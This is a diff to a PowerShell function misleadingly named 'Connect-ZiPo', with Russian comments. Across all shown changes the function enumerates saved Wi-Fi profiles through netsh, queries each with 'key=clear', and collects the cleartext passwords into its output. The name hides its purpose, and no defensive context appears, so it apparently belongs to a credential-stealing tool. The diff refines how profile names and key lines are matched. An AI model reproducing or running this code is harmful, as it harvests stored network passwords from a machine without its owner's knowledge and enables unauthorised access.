@@ -87,8 +87,7 @@ function Connect-ZiPo {
         $output = cmd /c "netsh wlan show profiles" | Out-String
         $lines = $output -split "`r?`n"
 
-        # Выбираем строки, содержащие имя профиля (все строки с ":" и не пустые)
-        $profiles = $lines | Where-Object { ($_ -like "*:*") -and ($_ -notmatch "Group policy") }
+        $profiles = $lines | Where-Object { ($_ -like "*:*") -and ($_ -match "Profile") }
 
         if (-not $profiles -or $profiles.Count -eq 0) {
             return "[INFO] No Wi-Fi profiles found."
@@ -103,10 +102,15 @@ function Connect-ZiPo {
             $results += "`n[$profile]`n"
 
             $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
-            $keyLines = $details -split "`r?`n" | Where-Object { $_ -match "Key Content|Содержимое ключа" }
+            $detailLines = $details -split "`r?`n"
 
-            if ($keyLines.Count -gt 0) {
-                $results += ($keyLines -join "`n")
+            # Поиск строки с содержимым ключа без regex
+            $keyLine = $detailLines | Where-Object {
+                ($_ -like "*Key Content*") -or ($_ -like "*Содержимое ключа*")
+            }
+
+            if ($keyLine) {
+                $results += ($keyLine -join "`n")
             } else {
                 $results += "[!] No key found"
             }
@@ -118,6 +122,7 @@ function Connect-ZiPo {
         return "[ERROR] Failed to retrieve Wi-Fi credentials: $($_.Exception.Message)"
     }
 }
+
 
 
 
